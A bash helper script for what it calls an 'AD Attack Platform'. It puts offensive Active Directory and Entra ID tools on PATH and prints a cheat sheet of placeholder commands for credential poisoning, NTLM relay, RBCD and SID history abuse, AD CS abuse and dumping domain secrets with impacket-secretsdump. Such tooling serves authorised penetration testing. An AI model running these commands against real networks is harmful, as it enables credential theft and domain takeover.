#!/bin/bash
# Helper script that sources this on login to make tools available
# Source this in your shell: source /opt/scripts/tools.sh

export PATH="$PATH:/opt/tools/Responder:/opt/tools/RelayKing-Depth:/opt/tools/gopacket:/opt/tools/AdStrike:/opt/tools/EntraFalcon:/opt/tools/entra-ca-insight:/opt/tools/pySIDHistory:/opt/tools/getSPNless:/opt/tools/ad-reaper:/root/.local/bin"

alias responder='python3 /opt/tools/Responder/Responder.py'
alias relayking='python3 /opt/tools/RelayKing-Depth/relayking.py'
alias bloodhound-python='python3 -m bloodhound'
alias ca-insight='python3 /opt/tools/entra-ca-insight/main.py'
alias pysidhistory='python3 /opt/tools/pySIDHistory/main.py'
alias getspnless='python3 /opt/tools/getSPNless/getSPNless.py'
alias adreaper='python3 /opt/tools/ad-reaper/ad-reaper.py'
alias adstrike='bash /opt/tools/AdStrike/run.sh'
alias entrafalcon='pwsh /opt/tools/EntraFalcon/EntraFalcon.ps1'

help() {
  cat <<'EOF'
╔══════════════════════════════════════════════════════════╗
║           ForestGump.sh - AD Attack Platform            ║
╚══════════════════════════════════════════════════════════╝

──  RECONNAISSANCE  ──────────────────────────────────────
  bloodhound-python  -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
                    BloodHound data collector (ingestor)
  ldapdomaindump     LDAP://TARGET -u DOMAIN\\USER -p PASS
                    Dump AD objects via LDAP
  adreaper            -u USER -p PASS -d DOMAIN -dc-ip TARGET
                    Multi-protocol AD enumeration
  nxc ldap TARGET -u USER -p PASS --users
                    NetExec LDAP enumeration

──  AUTHENTICATION ATTACKS  ──────────────────────────────
  Responder -I eth0 -w
                    LLMNR/NBT-NS/mDNS poisoning
  coercer list TARGET -u USER -p PASS -d DOMAIN
                    Auto coercion of Windows auth
  impacket-getTGT DOMAIN/USER:PASS@TARGET
                    Request TGT (then use with KRB5CCNAME)

──  PRIVILEGE ESCALATION  ────────────────────────────────
  bloodyAD --host TARGET -d DOMAIN -u USER -p PASS
                    AD privilege escalation
  impacket-secretsdump DOMAIN/USER:PASS@TARGET
                    Dump domain secrets
  certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET
                    AD CS abuse
  impacket-rbcd -action write -delegate-from DELEGATE -delegate-to TARGET DOMAIN/USER:PASS
                    RBCD attack
  pysidhistory TARGET DOMAIN USER:PASS
                    SID history injection

──  RELAY & PROXY  ───────────────────────────────────────
  relayking          NTLM/Kerberos relay detection tool
  impacket-ntlmrelayx -tf targets.txt -smb2support
                    NTLM relay

──  CLOUD (AZURE/ENTRA ID)  ─────────────────────────────
  roadrecon auth -u USER@DOMAIN -p PASS
                    Azure AD authentication
  roadrecon gather   Enumerate Azure AD
  ca-insight         Conditional Access policy analysis
  entrafalcon        Entra ID enumeration (PowerShell)

──  UTILITY  ─────────────────────────────────────────────
  gopacket-*         Go-based impacket (63 tools, tab-complete)
  impacket-*         Python impacket suite
  nxc                NetExec (multi-protocol)
  getspnless SPN TARGET
                    SPN-less RBCD attack

──  QUICK START  ─────────────────────────────────────────
  1. nxc ldap TARGET -u USER -p PASS --users     # recon users
  2. bloodhound-python -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
  3. impacket-secretsdump DOMAIN/USER:PASS@TARGET
  4. certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET

Run any tool with --help / -h for its specific flags.
EOF
}
